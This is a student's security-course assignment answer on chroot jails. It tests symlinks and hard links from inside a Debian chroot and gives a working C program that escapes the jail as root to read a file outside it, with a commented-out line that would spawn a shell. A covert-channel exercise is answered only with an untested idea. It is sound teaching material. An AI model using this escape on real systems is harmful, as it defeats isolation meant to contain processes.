# Assignment 5

## 1: Compartmentalization with *chroot*

Each process in UNIX knows the root of the filesystem (typically denoted /). The **chroot** system call changes this root and **chroot** utility starts a process with a different filesystem root. The **chroot** mechanism can be used for *compartmentalization*: A process that is running in a **chroot** environment can only access files that are below its filesystem root. It can also be used to test new systems. For example, one can install the development branch of a Linux distribution in a **chroot** environment and test it without having to reboot. One can also use it as a development environment; for example, it is possible to run a Debian Linux system in a **chroot** environment on an Android phone (after rooting the phone; see, for example, [https://cryptojedi.org/misc/nexuss-debian.shtml](https://cryptojedi.org/misc/nexuss-debian.shtml)). The **chroot** mechanism for compartmentalization can be used to add a certain level of security, but it has various limitations, which we will investigate in the following.

**Prerequisites**

A process running in a **chroot** environment needs various files (libraries etc.) accessible. The easiest (but not necessarily most secure) way to achieve this is to make a whole UNIX environment available. Debian Linux and derivatives allow to "install" the whole environment in a directory, for example, in **/tmp/debian**, as follows:

`$ debootstrap --arch amd64 jessie /tmp/debian/ http://ftp.nl.debian.org/debian/`

This is going to take a while; afterwards you can (as root) **chroot** into this environment by running `$ chroot /tmp/debian`

The environment is a quite minimal UNIX environment, so you might want to install additional software, for example (inside the **chroot** environment):

`$ apt-get install gcc`

The **chroot** compartmentalization does, by design, not prevent root to break out of the **chroot** "jail". The way to break out of the jail, for root, involves the following steps:

1. Create a subdirectory in the current **chroot** environment (**mkdir** standard C library function);
2. (open the current working directory using the **open** syscall);
3. use the **chroot** syscall to **chroot** into the subdirectory created in step 1;
4. (change the working directory back to the original working directory with the **fchdir** syscall);
5. perform **chdir("..")** syscalls to change to the actual (non-**chroot**) root of the filesystem.

The two steps in parantheses are only required if the **chroot** system call also changes the working directory to the **chroot** directory. Note that after step 4, the process has a working directory outside the current root directory; this is what allows the process to change the working directory further up to the actual root.

**Objectives**

* a) Create a symbolic link from somewhere inside **/tmp/debian/** to somewhere outside **/tmp/debian**. Can you follow the symbolic link when using **/tmp/debian** as a **chroot** jail?

	* Answer: I'm using Kali Linux which seems to be a derivative of Debian. Invoking the deboostrap command gave me an `bash: debootstrap: command not found` error. After executing `sudo apt-get install debootstrap` it worked though. 

	```
	root@kali:~# chroot /tmp/debian/
	root@kali:/# pwd
	/
	root@kali:/# ls -alF
	total 84
	drwxr-xr-x 21 root root 4096 Dec 20 12:53 ./
	drwxr-xr-x 21 root root 4096 Dec 20 12:53 ../
	drwxr-xr-x  2 root root 4096 Dec 20 12:53 bin/
	drwxr-xr-x  2 root root 4096 Nov 19 15:32 boot/
	drwxr-xr-x  4 root root 4096 Dec 20 12:53 dev/
	drwxr-xr-x 52 root root 4096 Dec 20 12:53 etc/
	drwxr-xr-x  2 root root 4096 Nov 19 15:32 home/
	drwxr-xr-x 12 root root 4096 Dec 20 12:53 lib/
	drwxr-xr-x  2 root root 4096 Dec 20 12:53 lib64/
	drwxr-xr-x  2 root root 4096 Dec 20 12:53 media/
	drwxr-xr-x  2 root root 4096 Dec 20 12:53 mnt/
	drwxr-xr-x  2 root root 4096 Dec 20 12:53 opt/
	drwxr-xr-x  2 root root 4096 Nov 19 15:32 proc/
	drwx------  2 root root 4096 Dec 20 12:53 root/
	drwxr-xr-x  4 root root 4096 Dec 20 12:53 run/
	drwxr-xr-x  2 root root 4096 Dec 20 12:53 sbin/
	drwxr-xr-x  2 root root 4096 Dec 20 12:53 srv/
	drwxr-xr-x  2 root root 4096 Apr  6  2015 sys/
	drwxrwxrwt  2 root root 4096 Dec 20 12:53 tmp/
	drwxr-xr-x 10 root root 4096 Dec 20 12:53 usr/
	drwxr-xr-x 11 root root 4096 Dec 20 12:53 var/
	```

	I created a folder called "cd_me_if_you_can" outside the chroot environment with my original root user and created a symbolic link inside the chroot environment which points to the "cd_me_if_you_can" folder. It was **not** possible to cd into this directory inside the chroot environment and therefore **not** possible to follow the symlink:

	```
	root@kali:~# mkdir cd_me_if_you_can
	root@kali:~# ln -s ./cd_me_if_you_can/ /tmp/debian/breakout_symlink
	root@kali:~# ll /tmp/debian/
	total 908
	drwxr-xr-x 23 root root   4096 Dec 20 08:35 ./
	drwxrwxrwt 13 root root   4096 Dec 20 08:35 ../
	drwxr-xr-x  2 root root   4096 Dec 20 07:53 bin/
	drwxr-xr-x  2 root root   4096 Nov 19 10:32 boot/
	drwxr-xr-x  2 root root   4096 Dec 20 08:07 breakout/
	drwxr-xr-x  2 root root   4096 Dec 20 08:23 .breakout/
	lrwxrwxrwx  1 root root     19 Dec 20 08:35 breakout_symlink -> ./cd_me_if_you_can/
	drwxr-xr-x  4 root root   4096 Dec 20 07:53 dev/
	drwxr-xr-x 52 root root   4096 Dec 20 07:58 etc/
	drwxr-xr-x  2 root root   4096 Nov 19 10:32 home/
	drwxr-xr-x 12 root root   4096 Dec 20 07:58 lib/
	drwxr-xr-x  2 root root   4096 Dec 20 07:53 lib64/
	drwxr-xr-x  2 root root   4096 Dec 20 07:53 media/
	drwxr-xr-x  2 root root   4096 Dec 20 07:53 mnt/
	drwxr-xr-x  2 root root   4096 Dec 20 07:53 opt/
	drwxr-xr-x  2 root root   4096 Nov 19 10:32 proc/
	drwx------  2 root root   4096 Dec 20 08:26 root/
	drwxr-xr-x  4 root root   4096 Dec 20 07:53 run/
	drwxr-xr-x  2 root root   4096 Dec 20 07:53 sbin/
	drwxr-xr-x  2 root root   4096 Dec 20 07:53 srv/
	drwxr-xr-x  2 root root   4096 Apr  6  2015 sys/
	drwxrwxrwt  2 root root   4096 Dec 20 08:28 tmp/
	-rwxr-xr-x  1 root root 829336 Dec 20 08:28 unchroot_basic*
	-rw-r--r--  1 root root    207 Dec 20 08:28 unchroot_basic.c
	drwxr-xr-x 10 root root   4096 Dec 20 07:53 usr/
	drwxr-xr-x 11 root root   4096 Dec 20 07:53 var/
	root@kali:~# chroot /tmp/debian/
	root@kali:/# ls -alF
	total 908
	drwxr-xr-x 23 root root   4096 Dec 20 13:35 ./
	drwxr-xr-x 23 root root   4096 Dec 20 13:35 ../
	drwxr-xr-x  2 root root   4096 Dec 20 13:23 .breakout/
	drwxr-xr-x  2 root root   4096 Dec 20 12:53 bin/
	drwxr-xr-x  2 root root   4096 Nov 19 15:32 boot/
	drwxr-xr-x  2 root root   4096 Dec 20 13:07 breakout/
	lrwxrwxrwx  1 root root     19 Dec 20 13:35 breakout_symlink -> ./cd_me_if_you_can/
	drwxr-xr-x  4 root root   4096 Dec 20 12:53 dev/
	drwxr-xr-x 52 root root   4096 Dec 20 12:58 etc/
	drwxr-xr-x  2 root root   4096 Nov 19 15:32 home/
	drwxr-xr-x 12 root root   4096 Dec 20 12:58 lib/
	drwxr-xr-x  2 root root   4096 Dec 20 12:53 lib64/
	drwxr-xr-x  2 root root   4096 Dec 20 12:53 media/
	drwxr-xr-x  2 root root   4096 Dec 20 12:53 mnt/
	drwxr-xr-x  2 root root   4096 Dec 20 12:53 opt/
	drwxr-xr-x  2 root root   4096 Nov 19 15:32 proc/
	drwx------  2 root root   4096 Dec 20 13:26 root/
	drwxr-xr-x  4 root root   4096 Dec 20 12:53 run/
	drwxr-xr-x  2 root root   4096 Dec 20 12:53 sbin/
	drwxr-xr-x  2 root root   4096 Dec 20 12:53 srv/
	drwxr-xr-x  2 root root   4096 Apr  6  2015 sys/
	drwxrwxrwt  2 root root   4096 Dec 20 13:28 tmp/
	-rwxr-xr-x  1 root root 829336 Dec 20 13:28 unchroot_basic*
	-rw-r--r--  1 root root    207 Dec 20 13:28 unchroot_basic.c
	drwxr-xr-x 10 root root   4096 Dec 20 12:53 usr/
	drwxr-xr-x 11 root root   4096 Dec 20 12:53 var/
	root@kali:/# cd breakout_symlink 
	bash: cd: breakout_symlink: No such file or directory
	```

* b) Create a hard link from somewhere inside **/tmp/debian** to somewhere outside **/tmp/debian**. Can you follow the hard link when using **/tmp/debian** as a **chroot** jail?

	* Answer: I created a file called "cat_me_if_you_can" outside the chroot environment with my original root user and created a hard link inside the chroot environment which points to the "cat_me_if_you_can" file. It was possible to cat the contents of the hard link inside the chroot environment and therefore possible to follow the hard link:

	```
	root@kali:~# touch cat_me_if_you_can
	root@kali:~# nano cat_me_if_you_can
	root@kali:~# ln ./cat_me_if_you_can /tmp/debian/cat_me_if_you_can
	root@kali:~# chroot /tmp/debian/
	root@kali:/# cat cat_me_if_you_can 
	These aren't the droids you're looking for!
	```

* c) Write a program that, when executed inside the **/tmp/debian chroot** jail with root rights, reads the file **/tmp/outside**, which is *outside** the **chroot** jail and outputs its contents. Submit the source code of the program. **Note:** The program will first have to escape the **chroot** jail using the above sequence. 


	* Answer: Handy websites which helped me solving this exercise: [Escaping a chroot jail/1](https://filippo.io/escaping-a-chroot-jail-slash-1/), [Breaking out of chroot environment (german)](https://debianforum.de/forum/viewtopic.php?f=37&t=89606), [Prison Break (chroot)](https://warsang.ovh/prison-break-chroot/), [Printing contents of text file in c](https://stackoverflow.com/questions/3463426/in-c-how-should-i-read-a-text-file-and-print-all-strings). The corresponding c file and its compiled format can be found under chroot_reader.c and chroot_reader.

	```
	#include <sys/stat.h>
	#include <unistd.h>
	#include <stdio.h>
	#include <stdlib.h>

	int main() {
	        mkdir(".breakout", 0755);
	        chroot(".breakout");
	        // This line also works but it seems more elegant to just use a for loop
	        //chroot("../../../../../../../../../../../../../../../..");
	        int x;
	        for(x = 0; x < 1000; x++){
	                chdir("..");
	        }

	        chroot(".");
	        print_file_contents("/tmp/outside");
	        return 0;
	       // return execl("/bin/bash", "-i", NULL);
	}

	int print_file_contents(char *filename){
	        int c;
	        FILE *file;
	        file = fopen(filename, "r");
	        if (file) {
	        while ((c = getc(file)) != EOF)
	                putchar(c);
	        fclose(file);
	        }
	}
	```

	After compiling and running the program inside the chroot envionment it indeed prints out the content of the **/tmp/outside** file which lies outside the chroot environment:

	```
	root@kali:/# gcc -static -o chroot_reader chroot_reader.c 
	root@kali:/# ./chroot_reader 
	These aren't the droids you're looking for!
	```


* d) Does the program also function without root permissions? Explain why or why not. **Note:** You can use **chroot --userspec USERNAME** to try this.

	* Answer: The program does not function without root permission because based on the documentation of chroot you have to be root to execute the chroot command. A normal user is therefore not privileged to execute chroot and therefore this program does not work.

	```
	root@kali:~# chroot --userspec testuser1 /tmp/debian
	bash: /root/.bashrc: Permission denied
	I have no name!@kali:/$ 
	I have no name!@kali:/$ ./chroot_reader 
	I have no name!@kali:/$
	```


## 2: Covert channels (again)

This exercise is a bit of a preparation for next week's lecture on virtualization. Virtualization (as with vmware, virtualbox, xen or other solutions) significantly reduces covert channels, however it does not fully eliminate covert channels (and side channels).

**Objective**

Write a program that communicate through a covert channel from one VMWare virtual machine to another VMWare virtual machine.
**Note:** The program does not have to have a large communication bandwidth. It is sufficient if the sender sends one bit and the receiver receives this one but with high probability.

	* Answer: There are different ideas how such a covert channel could look like. Two articles seem promising to me. Read [Covert Channel using Man-In-The-Middle over HTTPS](http://scholarworks.rit.edu/cgi/viewcontent.cgi?article=1918&context=other) and [Covert Channels](https://www.sans.org/reading-room/whitepapers/detection/covert-channels-33413). I would probably choose the ICMP protocol and hide my data in the ICMP header data field. Because I do not have enough time to implement a client-server implementation in C which uses the ICMP protocol as the covert channel I just state that this would probably my way to do it.


	




